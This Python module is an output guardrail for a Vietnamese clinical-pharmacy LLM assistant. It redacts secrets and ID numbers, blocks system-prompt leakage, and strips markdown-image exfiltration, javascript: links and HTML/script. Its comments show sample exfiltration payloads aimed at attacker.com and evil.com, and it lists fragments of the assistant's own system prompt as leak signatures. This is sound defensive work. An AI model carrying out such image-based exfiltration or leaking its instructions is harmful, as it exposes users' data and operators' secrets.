"""
Output Guardrail: OWASP LLM02 (Sensitive Info Disclosure) + OWASP LLM07 (System Prompt Leakage)
+ Markdown Exfiltration & Arbitrary HTML/Script Blocker.
"""

import re
from typing import Iterable, Optional, Set, Tuple

# High-confidence internal system prompt signatures that must NEVER appear in user-facing output
_SYSTEM_PROMPT_LEAK_SIGNATURES = [
    "zero free claims policy",
    "owasp llm01 defense",
    "paperqa2 evidence synthesizer",
    "agentic clinical nlu router",
    "phân cấp đặc quyền & cách ly dữ liệu",
    "instruction hierarchy & spotlighting",
    "tuân thủ chuẩn berkeley function calling",
    "clinical_multimodal_system_prompt",
    "gemini_nlu_system_prompt",
    "_deep_web_system_instruction",
    "sau câu trả lời, xuất thêm đúng một thẻ <answer_claims>",
    "xuất đúng 1 khối thẻ sau chứa 3 câu hỏi tiếp theo ngắn gọn",
    "scannable clinical layout — tuyệt đối không tạo bức tường chữ",
    "dữ liệu bên trong <medical_search_evidence> và <deep_article_extracts> là tài liệu đọc",
]

# Internal structural tags that should never leak verbatim to end-user replies
_LEAKED_INTERNAL_TAG_RE = re.compile(
    r"</?\s*(?:ANSWER_CLAIMS|follow_up_questions|medical_search_evidence|deep_article_extracts|untrusted_[a-z0-9_]+|user_input_[a-z0-9]+)\s*>",
    re.IGNORECASE,
)

# Markdown image data-exfiltration pattern: ![alt](https://attacker.com/pixel?secret=...)
_MD_EXTERNAL_IMAGE_RE = re.compile(
    r"!\[([^\]]{0,120})\]\(\s*(?:https?:|data:)[^)\s]+\)",
    re.IGNORECASE,
)

# Dangerous markdown link schemes (javascript:, data:, vbscript:)
_MD_DANGEROUS_LINK_RE = re.compile(
    r"\[([^\]]{1,200})\]\(\s*(?:javascript|data|vbscript)\s*:[^)]+\)",
    re.IGNORECASE,
)


def detect_system_prompt_leakage(text: str) -> Tuple[bool, str]:
    """
    Detect OWASP LLM07 System Prompt Leakage by matching internal instruction signatures
    or combinations of leaked prompt-control tags.
    """
    if not text:
        return False, ""
    lower = text.lower()
    matched = [sig for sig in _SYSTEM_PROMPT_LEAK_SIGNATURES if sig in lower]
    if len(matched) >= 1:
        return True, f"Rò rỉ cấu trúc chỉ dẫn hệ thống ({matched[0]})"

    # Leaking >= 2 internal prompt-engineering rules simultaneously
    rule_hits = sum(
        1
        for marker in (
            "bạn là trợ lý ai dược lâm sàng",
            "hợp đồng trả lời:",
            "chỉ sử dụng các dữ kiện",
            "tuyệt đối không dùng emoji",
            "quy tắc an toàn & chống prompt injection",
        )
        if marker in lower
    )
    if rule_hits >= 3:
        return True, "Rò rỉ tập quy tắc chỉ dẫn nội bộ của mô hình"

    return False, ""


def validate_output_guardrail(raw_response: str, query: str = "") -> str:
    """
    Output Rail: Rào chắn hậu xử lý ngăn chặn:
    - Rò rỉ khóa bí mật / JWT / chuỗi kết nối CSDL / CCCD (OWASP LLM02)
    - Rò rỉ chỉ dẫn hệ thống nội bộ / System Prompt Leakage (OWASP LLM07)
    - Rò rỉ dữ liệu qua ảnh Markdown / link javascript:/data: (Data Exfiltration)
    - Sinh mã HTML/script trái phép
    """
    if not raw_response:
        return raw_response

    if len(raw_response) > 12000:
        raw_response = raw_response[:12000] + "\n\n[Phần còn lại đã được lược bỏ do giới hạn độ dài.]"

    # 1. Redact sensitive credentials & PII
    scrubbed = re.sub(
        r"(?i)(AIzaSy[A-Za-z0-9_-]{28,35}|sk-[A-Za-z0-9]{32,}|gsk_[A-Za-z0-9]{20,}|Bearer\s+[A-Za-z0-9_\-\.]{20,})",
        "[REDACTED_API_KEY]",
        raw_response,
    )
    scrubbed = re.sub(
        r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b",
        "[REDACTED_JWT]",
        scrubbed,
    )
    scrubbed = re.sub(r"(?i)\b(?:CCCD|CMND)\s*[:#]?\s*\d{9,12}\b", "[REDACTED_ID]", scrubbed)
    scrubbed = re.sub(r"(?i)(postgres://|postgresql://|mysql://|sqlite://)[^\s]+", "[REDACTED_DB_CONNECTION]", scrubbed)

    # 2. Neutralize SQL/DB internal error traces
    if "OperationalError" in scrubbed or "sqlite3.IntegrityError" in scrubbed or "syntax error" in scrubbed.lower():
        scrubbed = (
            "⚠️ **Thông báo hệ thống**: Đã xảy ra lỗi kỹ thuật trong quá trình truy xuất dữ liệu an toàn. "
            "Yêu cầu đã được ghi vết kiểm toán để đội ngũ quản trị kiểm tra."
        )

    # 3. OWASP LLM07: Block System Prompt Leakage
    leaked, _leak_reason = detect_system_prompt_leakage(scrubbed)
    if leaked:
        return (
            "🛡️ **RÀO CHẮN ĐẦU RA (Output Rail Blocked - OWASP LLM07:2025)**\n\n"
            "• **Phát hiện:** Phản hồi có dấu hiệu tiết lộ cấu trúc chỉ dẫn nội bộ của hệ thống.\n"
            "• **Hành động:** Hệ thống đã tự động chặn nội dung này theo chính sách bảo mật thông tin y tế.\n"
            "• **Gợi ý:** Vui lòng đặt câu hỏi chuyên môn về thuốc, tương tác thuốc hoặc quy chế dược bệnh viện."
        )

    # 4. Strip any accidental leaked internal delimiter tags
    scrubbed = _LEAKED_INTERNAL_TAG_RE.sub("", scrubbed).strip()

    # 5. Neutralize Markdown image exfiltration & dangerous link schemes
    scrubbed = _MD_EXTERNAL_IMAGE_RE.sub(lambda m: f"[Hình ảnh ngoài đã bị chặn: {m.group(1) or 'external'}]", scrubbed)
    scrubbed = _MD_DANGEROUS_LINK_RE.sub(lambda m: m.group(1), scrubbed)

    # 6. Block arbitrary HTML / Website / Script generation
    if re.search(
        r"(?i)(?:<!DOCTYPE\s+html|<html[\s>]|<head[\s>]|<body[\s>]|```html\s*(?:<!DOCTYPE|<html|<head|<body|<div|<title|<script|<style)|<script[\s>]|javascript:)",
        scrubbed,
    ):
        scrubbed = (
            "🛡️ **RÀO CHẮN ĐẦU RA (Output Rail Blocked - OWASP LLM02:2025)**\n\n"
            "• **Phát hiện:** Phản hồi chứa cấu trúc mã HTML / Website không hợp lệ.\n"
            "• **Hành động:** Hệ thống đã tự động ngăn chặn và vô hiệu hóa nội dung theo chính sách an toàn thông tin y tế.\n"
            "• **Nguyên tắc:** Trợ lý Agent Lâm Sàng tuân thủ quy chế Dược lâm sàng (Thông tư 20/2017/TT-BYT, TT 22/2011/TT-BYT, Dược Thư Quốc Gia) "
            "và chỉ phản hồi bằng định dạng Markdown lâm sàng, không hỗ trợ hiển thị tệp HTML hoặc tạo website."
        )

    return scrubbed


_STREAM_UNSAFE_HTML_RE = re.compile(
    r"(?i)(?:<!DOCTYPE\s+html|<html[\s>]|<head[\s>]|<body[\s>]|```html\s*(?:<!DOCTYPE|<html|<head|<body|<div|<title|<script|<style)|<script[\s>]|javascript:)",
)
_STREAM_URL_COMPLETE_RE = re.compile(r"(https?://[^\s\)\]>\"']+)(?=[\s\)\]>\"']|$)")
_STREAM_SECRET_PATTERNS = (
    (re.compile(r"(?i)(AIzaSy[A-Za-z0-9_-]{28,35}|sk-[A-Za-z0-9]{32,}|gsk_[A-Za-z0-9]{20,}|Bearer\s+[A-Za-z0-9_\-\.]{20,})"), "[REDACTED_API_KEY]"),
    (re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"), "[REDACTED_JWT]"),
    (re.compile(r"(?i)\b(?:CCCD|CMND)\s*[:#]?\s*\d{9,12}\b"), "[REDACTED_ID]"),
    (re.compile(r"(?i)(postgres://|postgresql://|mysql://|sqlite://)[^\s]+"), "[REDACTED_DB_CONNECTION]"),
)


class StreamingOutputGuardrail:
    """
    Real-time Sliding-Window Output Guardrail for SSE token streaming (`/chat/stream`).
    Holds a trailing lookahead buffer (`hold_chars`) so split tokens (e.g. `<scr` + `ipt>`,
    `![img](https://evil` + `.com)`, or system prompt leak signatures) are caught BEFORE
    any unsafe token reaches the browser over SSE.
    """

    def __init__(
        self,
        *,
        allowed_urls: Optional[Iterable[str]] = None,
        stop_marker: str = "<follow_up_questions",
        stop_markers: Optional[Iterable[str]] = None,
        hold_chars: int = 160,
    ) -> None:
        self.allowed_urls: Optional[Set[str]] = (
            {u.strip().rstrip(".,;:") for u in allowed_urls if u} if allowed_urls is not None else None
        )
        markers = list(stop_markers) if stop_markers is not None else ([stop_marker] if stop_marker else [])
        self.stop_markers: Tuple[str, ...] = tuple(m.lower() for m in markers if m)
        self.stop_marker = self.stop_markers[0] if self.stop_markers else ""
        max_marker_len = max((len(m) for m in self.stop_markers), default=0)
        self.hold_chars = max(max_marker_len, int(hold_chars))
        self.accumulated: str = ""
        self.pending: str = ""
        self.stopped_at_marker: bool = False
        self.tripped: bool = False
        self.trip_reason: str = ""

    def _scrub_inline(self, text: str) -> str:
        out = text
        for pat, repl in _STREAM_SECRET_PATTERNS:
            out = pat.sub(repl, out)
        out = _LEAKED_INTERNAL_TAG_RE.sub("", out)
        out = _MD_DANGEROUS_LINK_RE.sub(lambda m: m.group(1), out)
        if self.allowed_urls is not None:
            def _check_url(m: re.Match) -> str:
                raw_u = m.group(1)
                clean_u = raw_u.rstrip(".,;:")
                if clean_u in self.allowed_urls:
                    return raw_u
                return "[liên kết ngoài không xác thực đã bị chặn]"

            out = _STREAM_URL_COMPLETE_RE.sub(_check_url, out)
        return out

    def _check_hard_trip(self) -> Optional[str]:
        leaked, leak_reason = detect_system_prompt_leakage(self.accumulated)
        if leaked:
            return f"system_prompt_leak:{leak_reason}"
        if _MD_EXTERNAL_IMAGE_RE.search(self.accumulated):
            return "markdown_image_exfiltration"
        if _STREAM_UNSAFE_HTML_RE.search(self.accumulated):
            return "unsafe_html_or_script"
        return None

    def feed(self, delta: str) -> Tuple[Optional[str], bool]:
        """
        Feed a new LLM stream delta.
        Returns `(safe_chunk_to_emit_or_None, was_tripped)`.
        """
        if not delta or self.tripped or self.stopped_at_marker:
            return None, self.tripped

        self.accumulated += delta
        trip = self._check_hard_trip()
        if trip:
            self.tripped = True
            self.trip_reason = trip
            self.pending = ""
            return None, True

        combined = self.pending + delta
        lower_comb = combined.lower()
        if self.stop_markers:
            earliest_idx = -1
            for marker in self.stop_markers:
                idx = lower_comb.find(marker)
                if idx != -1 and (earliest_idx == -1 or idx < earliest_idx):
                    earliest_idx = idx
            if earliest_idx != -1:
                safe_prefix = self._scrub_inline(combined[:earliest_idx])
                self.stopped_at_marker = True
                self.pending = ""
                return (safe_prefix if safe_prefix else None), False

        if len(combined) > self.hold_chars:
            cut = len(combined) - self.hold_chars
            # Never split an active token / URL / markdown link across the emit/pending boundary
            if cut > 0 and not combined[cut - 1].isspace():
                ws_pos = max(combined.rfind(" ", 0, cut), combined.rfind("\n", 0, cut), combined.rfind("\t", 0, cut))
                if ws_pos >= 0:
                    cut = ws_pos + 1
                else:
                    cut = 0
            if cut > 0:
                emit_raw = combined[:cut]
                self.pending = combined[cut:]
                emit_clean = self._scrub_inline(emit_raw)
                return (emit_clean if emit_clean else None), False

        self.pending = combined
        return None, False

    def flush(self) -> Optional[str]:
        """Flush remaining safe buffer once stream finishes cleanly."""
        if self.tripped or self.stopped_at_marker or not self.pending:
            self.pending = ""
            return None
        trip = self._check_hard_trip()
        if trip:
            self.tripped = True
            self.trip_reason = trip
            self.pending = ""
            return None
        tail = self._scrub_inline(self.pending)
        self.pending = ""
        return tail if tail else None
